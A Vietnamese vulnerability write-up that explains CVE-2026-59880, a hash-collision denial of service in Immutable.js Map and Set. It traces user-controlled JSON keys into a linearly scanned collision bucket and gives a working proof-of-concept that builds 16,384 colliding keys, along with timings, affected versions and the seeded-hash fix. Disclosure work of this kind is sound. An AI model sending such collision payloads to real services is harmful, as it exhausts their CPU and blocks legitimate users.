# CVE-2026-59880: Hash-collision algorithmic complexity denial of service trong Immutable.Map/Set

## Intro ngắn

Đây là CVE đầu tiên của mình: CVE-2026-59880, một lỗi Hash Collision Denial of Service trong Immutable.js.

Trong bản vulnerable, khi nhiều key khác nhau có cùng hash, `Immutable.js` gom chúng vào cùng một `HashCollisionNode`. Các cặp key/value trong node này chỉ được xếp thành một danh sách `entries`. Nói đơn giản, thư viện đã tìm được đúng “ngăn” chứa các key, nhưng không biết ngay key cần tìm nằm ở đâu bên trong ngăn đó. Vì vậy, mỗi lần thêm hoặc đọc key, nó phải kiểm tra lần lượt từng phần tử. Khi hàng nghìn key cùng bị dồn vào đây, số lần so sánh tăng rất nhanh, CPU bị chiếm lâu và request có thể làm nghẽn event loop.

Thông tin chính:

- CVE: CVE-2026-59880
- Advisory: [GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- Package: npm immutable
- Ảnh hưởng: 4.x <4.3.9; 5.x >=5.0.0-beta.1 và <5.1.8
- Bản sửa: 4.3.9 và 5.1.8
- Impact: CPU-bound Denial of Service
- Severity: High, CVSS v4 8.7

## Background

### Immutable.js là gì?

Để hiểu bug này thì trước hết phải biết `Immutable.js` đang làm gì. Nói đơn giản, đây là thư viện JavaScript cung cấp các cấu trúc dữ liệu immutable. Tức là khi mình gọi `.set()`, nó không sửa thẳng dữ liệu cũ mà trả về một bản mới.

```js
const map1 = Immutable.Map({ name: 'alice' });
const map2 = map1.set('role', 'user');

console.log(map1.toObject());
// { name: 'alice' }

console.log(map2.toObject());
// { name: 'alice', role: 'user' }
```

Ở ví dụ trên, map1 vẫn giữ nguyên còn map2 là kết quả mới. Đây là phần “immutable” cơ bản.

Điểm mình chú ý là `Map` và `Set`. Bên trong hai cấu trúc này, `Immutable.js` dùng `hash()` để tìm và lưu dữ liệu. Vậy nếu nhiều key khác nhau cho ra cùng một hash thì chuyện gì sẽ xảy ra?

### Vì sao Map cần hash?

Để dễ hình dung, có thể coi Map như một cuốn danh bạ. Khi cần tìm một người, mình không muốn lật từng trang từ đầu đến cuối. Mình muốn có một cách tra cứu nhanh để đi thẳng tới nơi chứa thông tin cần tìm.

`hash()` đóng vai trò như chỉ mục:

```text
key -> tính hash -> đi vào cấu trúc cây -> lưu hoặc tìm value
```

Collision cũng không phải điều gì quá lạ. Hash map nào cũng phải có cách xử lý trường hợp hai key rơi vào cùng một vị trí. Mình bắt đầu thấy nguy hiểm khi ghép ba chuyện lại với nhau: hash có thể đoán trước, user kiểm soát được key, và collision bucket lại được xử lý bằng một list phải quét từng phần tử.

## Mình bắt đầu trace từ đâu?

Lúc này mình chưa muốn nhảy ngay vào PoC. Mình muốn chắc rằng key do user gửi thật sự đi được hết đường tới chỗ hash và collision bucket. Nếu key chỉ nằm trong request nhưng không đi vào cấu trúc dữ liệu bên trong, thì cũng chẳng có gì để khai thác.

Mình bắt đầu lần theo đường đi của một key từ request vào trong thư viện: nó có đi tới `Immutable.Map` không, có đi qua `hash()` không, được lưu ở đâu khi bị collision, và tại sao quá trình đó lại tốn nhiều CPU.

Đường đi mình muốn kiểm tra là: từ một key trong JSON, nó đi qua `fromJS()` hoặc `Immutable.Map()`, rồi được đưa vào `map.set()`. Từ đây, `Immutable.js` tiếp tục gọi `updateMap()`, `updateNode()` và tính hash cho key. Nếu nhiều key khác nhau có cùng hash, chúng sẽ bị đưa vào cùng một `HashCollisionNode`. Khi đó, các hàm `get()` và `update()` phải lần lượt kiểm tra từng key trong node này. Ghép các bước lại, mình mới thấy vì sao một input do user kiểm soát có thể khiến CPU bị tiêu tốn rất nhiều.

## Trace code từng bước

### Bước 1: Key trong JSON đi vào `fromJS()`

Để trace cho dễ, mình giả sử ứng dụng có một endpoint nhận JSON từ user rồi chuyển thẳng dữ liệu đó sang Immutable.js:

```js
app.post('/api/import', express.json(), (req, res) => {
  const data = Immutable.fromJS(req.body);
  res.json({ size: data.size });
});
```

Ở đây, `express.json()` có nhiệm vụ đọc JSON body của request và đưa kết quả vào `req.body`. Vì dữ liệu này đến từ request, user có thể kiểm soát các field bên trong object, bao gồm cả tên key.

Sau đó, dòng `Immutable.fromJS(req.body)` nhận toàn bộ object đó và chuyển nó sang cấu trúc dữ liệu của Immutable.js. Đây là dòng mình sẽ lần theo: key từ `req.body` có được giữ nguyên không, và cuối cùng nó có đi vào hash map bên trong `Map` không?

Trong `src/fromJS.js`:

```js
export function fromJS(value, converter) {
  return fromJSWith(
    [],
    converter || defaultConverter,
    value,
    '',
    converter && converter.length > 2 ? [] : undefined,
    { '': value }
  );
}
```

Nếu `value` là `req.body`, `fromJS()` bắt đầu duyệt object đó. Đoạn quan trọng:

```js
Seq(value).map((v, k) =>
  fromJSWith(stack, converter, v, k, keyPath, value)
)
```

Ở đây:

```text
value = object đang được convert
v     = value của từng field
k     = key của từng field
```

Với:

```json
{
  "name": "alice",
  "role": "user"
}
```

callback sẽ nhận:

```text
k = "name", v = "alice"
k = "role", v = "user"
```

Vậy `k` chính là tên field trong JSON. Nếu JSON đến từ user, key đó có thể do user chọn.

Đến đây mình chưa cần đọc hết toàn bộ `fromJS()`. Chỉ cần nhìn vào callback này là đã thấy key của object được truyền vào dưới dạng `k`, còn value tương ứng nằm ở `v`. Đây là điểm đầu tiên xác nhận key từ request chưa bị mất trên đường đi.

Converter mặc định quyết định dữ liệu trở thành `List`, `Map` hay `Set`:

```js
function defaultConverter(k, v) {
  return isIndexed(v) ? v.toList() : isKeyed(v) ? v.toMap() : v.toSet();
}
```

Với object có key như JSON ở trên, nhánh `isKeyed(v)` đúng nên converter gọi `v.toMap()`. Đây là lúc object ban đầu được chuyển thành một `Map` của Immutable.js.

Như vậy, sau bước convert đầu tiên, key trong `req.body` vẫn còn nguyên và đang được chuyển tiếp tới `toMap()`:

```text
req.body key
  -> fromJS()
  -> Seq(value).map((v, k) => ...)
  -> k vẫn là key trong JSON
  -> defaultConverter()
  -> toMap()
  -> Immutable.Map chứa key đó
```

### Bước 2: `Map` gọi `map.set(k, v)`

Tiếp theo mình xem `Map` nhận object đó như thế nào. Constructor của `Map` có một nhánh quan trọng:

```js
constructor(value) {
  return value === undefined || value === null
    ? emptyMap()
    : isMap(value) && !isOrdered(value)
      ? value
      : emptyMap().withMutations((map) => {
          const iter = KeyedCollection(value);
          assertNotInfinite(iter.size);
          iter.forEach((v, k) => map.set(k, v));
        });
}
```

Nếu gọi:

```js
Immutable.Map({
  AaAa: 1,
  BBBB: 2
});
```

thì về cơ bản sẽ có:

```js
map.set('AaAa', 1);
map.set('BBBB', 2);
```

`KeyedCollection(value)` chuẩn hóa object đầu vào thành dạng có thể lặp theo cặp key/value. Sau đó `forEach()` lấy từng cặp và gọi `map.set(k, v)`. `withMutations()` chỉ là tối ưu để batch nhiều thay đổi; nó không biến key thành dạng khác và cũng không loại bỏ bước hash.

Với input từ user, đường đi ở đoạn này có thể hiểu như sau:

```text
JSON object
  -> KeyedCollection(value)
  -> iter.forEach((v, k) => map.set(k, v))
  -> k vẫn là key do user kiểm soát
```

### Bước 3: `set()` đi vào `updateMap()` và `updateNode()`

Trong `Map`, `set()` không tự lưu key vào một object JavaScript đơn giản. Nó chuyển việc đó cho `updateMap()`:

```js
set(k, v) {
  return updateMap(this, k, v);
}
```

Đoạn `set()` này chỉ là một wrapper mỏng. Nó giữ nguyên key `k` và chuyển key/value xuống phần xử lý bên trong:

```text
map.set(k, v)
  -> updateMap(map, k, v)
  -> updateNode(..., k, v, ...)
```

Khi `updateNode()` đi qua các node trong cây, thư viện cần biết hash của key để quyết định đi vào nhánh nào:

```js
keyHash = hash(key);
```

Đây là điểm nối quan trọng về mặt bảo mật:

```text
key do user kiểm soát -> hash(key)
```

### Bước 4: Hash string được tính thế nào?

Từ `hash(key)`, mình đi tiếp tới `src/Hash.ts` để xem string key được biến thành một con số như thế nào:

```ts
function hashString(string: string): number {
  let hashed = 0;
  for (let ii = 0; ii < string.length; ii++) {
    hashed = (31 * hashed + string.charCodeAt(ii)) | 0;
  }
  return smi(hashed);
}
```

Bỏ qua `| 0` và `smi()` trong giây lát, phần công thức chính là:

```text
hash mới = hash cũ * 31 + mã của ký tự hiện tại
```

Với `Aa`:

```text
"A": 31 * 0  + 65 = 65
"a": 31 * 65 + 97 = 2112
```

Với `BB`:

```text
"B": 31 * 0  + 66 = 66
"B": 31 * 66 + 66 = 2112
```

Vậy:

```text
"Aa" != "BB"
hash("Aa") === hash("BB")
```

Mỗi ký tự mới được đưa vào hash theo cùng một công thức cố định. `| 0` ép kết quả về số nguyên 32-bit, còn `smi()` đưa kết quả về dạng số mà thư viện sử dụng nội bộ.

Trong bản vulnerable, công thức này deterministic và không có random seed. Attacker có thể tính trước collision mà không cần biết trạng thái riêng của process đang chạy.

### Bước 5: Từ hai key thành hàng nghìn key

Sau khi xác nhận `Aa` và `BB` collision, mình dùng hai block này để tạo ra nhiều key khác nhau:

```js
function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];

    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }

    keys = next;
  }

  return keys;
}
```

Ở mỗi vòng, mỗi key cũ được nối thêm một trong hai block: `Aa` hoặc `BB`. Vì có hai lựa chọn cho mỗi key, số lượng key tăng gấp đôi sau mỗi round:

```text
rounds = 1 -> 2 key
rounds = 2 -> 4 key
rounds = 3 -> 8 key
rounds = 14 -> 16.384 key
```

Ví dụ `rounds = 2`:

```text
AaAa
AaBB
BBAa
BBBB
```

Các chuỗi tạo ra khác nhau, nhưng vẫn giữ cùng hiệu ứng hash. PoC kiểm tra lại điều này bằng chính `Immutable.hash()`:

```js
const collisionHash = Immutable.hash(keys[0]);

const allCollide = keys.every(
  (key) => Immutable.hash(key) === collisionHash
);
```

Đây là check quan trọng: mình không chỉ giả định chúng collision dựa trên công thức, mà hỏi chính thư viện xem tất cả key có thật sự trả về cùng một hash hay không.

### Bước 6: HashCollisionNode quét tuyến tính

Nhiều key cùng hash chưa đủ để kết luận có DoS. Thư viện hoàn toàn có thể dùng một secondary hash hoặc một cấu trúc khác để tìm key nhanh hơn. Vì vậy, bước tiếp theo là xem chính `HashCollisionNode` xử lý danh sách này như thế nào.

Trong bản vulnerable, các key khác nhau có cùng full primary hash được đưa vào `HashCollisionNode`:

```js
new HashCollisionNode(ownerID, keyHash, [node.entry, entry])
```

Node này giữ hai thông tin chính:

```js
this.keyHash = keyHash;
this.entries = entries;
```

`keyHash` là hash chung của toàn bộ bucket. `entries` là danh sách các cặp key/value thật sự, vì các key có cùng hash vẫn có thể là những key hoàn toàn khác nhau.

Hàm `get()`:

```js
get(shift, keyHash, key, notSetValue) {
  const entries = this.entries;

  for (let ii = 0, len = entries.length; ii < len; ii++) {
    if (is(key, entries[ii][0])) {
      return entries[ii][1];
    }
  }

  return notSetValue;
}
```

Hàm `get()` lấy danh sách `entries`, đi qua từng phần tử và dùng `is()` để so sánh key thật. Hash giống nhau chưa có nghĩa là hai key giống nhau, nên bước so sánh key thật vẫn bắt buộc phải có.

`update()` cũng phải quét danh sách để xem key đã tồn tại chưa trước khi sửa hoặc thêm:

```js
const entries = this.entries;
let idx = 0;
const len = entries.length;

for (; idx < len; idx++) {
  if (is(key, entries[idx][0])) {
    break;
  }
}
```

Nếu bucket có `n` phần tử, lần thêm đầu tiên chỉ kiểm tra rất ít phần tử, nhưng những lần sau phải kiểm tra nhiều hơn. Tổng số lần kiểm tra có thể gần:

```text
1 + 2 + 3 + ... + n = O(n²)
```

Điểm cần nhớ: không phải mọi collision đều nguy hiểm. Vấn đề là attacker tạo rất nhiều key có cùng full hash, rồi ép thư viện dùng một list tuyến tính rất lớn.

### Bước 7: `Set` cũng đi qua `Map`

Đến đây mình kiểm tra thêm `Set` để xem nó có đi theo một đường khác hay không. Trong `src/Set.js`, `Set` giữ một `Map` nội bộ:

```js
has(value) {
  return this._map.has(value);
}

add(value) {
  return updateSet(this, this._map.set(value, value));
}
```

Vì vậy, khi gọi `Set.add()`, thực tế nó cũng chạm vào `Map.set()`:

```text
Set.add(value)
  -> internal Map.set(value, value)
  -> updateMap()
  -> hash(value)
  -> collision bucket
```

Đó là lý do cả `Immutable.Map` và `Immutable.Set` đều bị ảnh hưởng: hai API khác nhau nhưng dùng chung đường xử lý hash bên trong.

## Proof of Concept

Sau khi trace xong source, mình viết PoC để kiểm tra lại từng phần quan trọng. Đầu tiên, hàm `makeCollidingStrings()` tạo ra các key từ block `Aa` và `BB`. Tiếp theo, `Immutable.hash()` xác nhận các key đó thật sự có cùng hash. Cuối cùng, `buildImmutableMap()` đưa từng key vào `Map` bằng `set()`.

PoC core dưới đây chỉ đo collision case. Nếu muốn benchmark đầy đủ, cần chạy thêm một nhóm key bình thường với cùng số lượng để làm baseline:

```js
const Immutable = require('../dist/immutable.js');

function makeCollidingStrings(rounds) {
  let keys = [''];

  for (let round = 0; round < rounds; round++) {
    const next = [];
    for (const key of keys) {
      next.push(key + 'Aa');
      next.push(key + 'BB');
    }
    keys = next;
  }

  return keys;
}

function buildImmutableMap(keys) {
  let map = Immutable.Map();
  for (const key of keys) {
    map = map.set(key, 1);
  }
  return map;
}

const collisionKeys = makeCollidingStrings(14);
const collisionHash = Immutable.hash(collisionKeys[0]);

console.log(
  collisionKeys.every((key) => Immutable.hash(key) === collisionHash)
);

const map = buildImmutableMap(collisionKeys);
```

Có ba dòng đáng chú ý trong đoạn code trên. `makeCollidingStrings(14)` tạo `2^14` key. `collisionKeys.every(...)` kiểm tra toàn bộ key có cùng hash hay không. Sau khi check trả về `true`, `buildImmutableMap()` mới lần lượt đưa các key vào `Map` để kích hoạt đường `set()` và `HashCollisionNode.update()`.

Khi chạy PoC gốc, write-up ghi nhận các số liệu sau trên máy test:

```text
normal Map build:    40.6 ms
collision Map build: 3617.6 ms
normal Map read:     7.4 ms
collision Map read:  2614.5 ms
```

Con số thay đổi theo máy, Node.js và cách build. Điều quan trọng là hai case có cùng số key nhưng collision case tốn CPU hơn rất nhiều.

## Impact

Để xem lỗi này có ý nghĩa thực tế hay không, mình quay lại các flow mà ứng dụng thường có thể sử dụng:

```js
Immutable.Map(req.body)
Immutable.fromJS(req.body)
state.merge(userObject)
state.mergeDeep(userObject)
```

Điểm chung của các flow này là object hoặc collection có dữ liệu do user kiểm soát được đưa thẳng vào `Map` hoặc được merge vào state hiện tại. Nếu key trong object là key collision, nó có thể kích hoạt đúng đường xử lý vừa trace ở trên.

Nếu ứng dụng chỉ dùng key cố định:

```js
map.set('username', req.body.username);
```

thì user chỉ kiểm soát value, không kiểm soát key. Trường hợp đó không đi theo trigger chính của CVE này.

Nếu user gửi một object có hàng nghìn key collision vào các flow này, quá trình tạo hoặc merge `Map` có thể giữ CPU trong thời gian dài. Với Node.js, điều đó còn ảnh hưởng tới event loop, nên các request khác cũng có thể bị chậm hoặc phải chờ.

## Patch / Mitigation

Bản sửa upstream dùng một secondary hash có seed theo process để tìm key nhanh hơn trong các collision bucket lớn. Hash public cũ vẫn được giữ; `is()` vẫn là bước quyết định hai key có thực sự bằng nhau hay không.

Nói đơn giản, bản fix vẫn dùng hash cũ để đi tới đúng `HashCollisionNode`, nhưng tạo thêm một cách phân loại các key bên trong node đó. Seed được tạo riêng cho từng process nên attacker không thể dễ dàng chuẩn bị trước cách phân loại thứ hai này. Bucket nhỏ vẫn giữ đường linear để tránh thêm overhead không cần thiết.

```text
4.x -> nâng lên 4.3.9
5.x -> nâng lên 5.1.8 hoặc mới hơn
```

Trước khi nâng cấp, có thể giới hạn body size, số lượng key và độ dài key. Đây chỉ là workaround, không thay thế update dependency.

## Timeline

```text
2026-06-05: Report gửi tới maintainer.
2026-06-05: Maintainer confirm/triage.
2026-06-25: Patch được chuẩn bị hoặc merge.
2026-06-26: GitHub Security Advisory GHSA-xvcm-6775-5m9r được publish.
2026-07-08: Advisory ghi nhận CVE-2026-59880.
```

## Reflection

Đây là CVE đầu tiên của mình.

Lúc đầu mình nghĩ nếu có CVE đầu tiên chắc sẽ vui lắm. Nhưng đến lúc nó thật sự xảy ra, cảm giác lại khác. Nhìn lại thì không phải bug bảo mật nào cũng cần kỹ thuật quá cao siêu. Đôi khi một công thức hash quen thuộc, một collision bucket dùng list tuyến tính, và một input do user kiểm soát đã đủ tạo thành vấn đề.

Điều mình thấy đáng nhớ nhất là cách trace. Không dừng ở việc thấy hai chuỗi có cùng hash, mà phải đi tiếp:

```text
user input
  -> key
  -> hash
  -> collision node
  -> linear scan
  -> resource exhaustion
```

## Contributors

Nguyen Vuong Tuan Hiep (nvth) - Researcher

GF - Space Creator

ChatGPT - Blog editor

## References

- [GitHub Security Advisory GHSA-xvcm-6775-5m9r](https://github.com/immutable-js/immutable-js/security/advisories/GHSA-xvcm-6775-5m9r)
- [NVD CVE-2026-59880](https://nvd.nist.gov/vuln/detail/CVE-2026-59880)
- [Immutable.js fix commit](https://github.com/immutable-js/immutable-js/commit/e51d49fc612ded5ec4dfb94ff294d22074269b0f)
- [Immutable.js documentation](https://immutable-js.com/)
- CWE-400: Uncontrolled Resource Consumption
- CWE-407: Inefficient Algorithmic Complexity
- OWASP API4: Unrestricted Resource Consumption
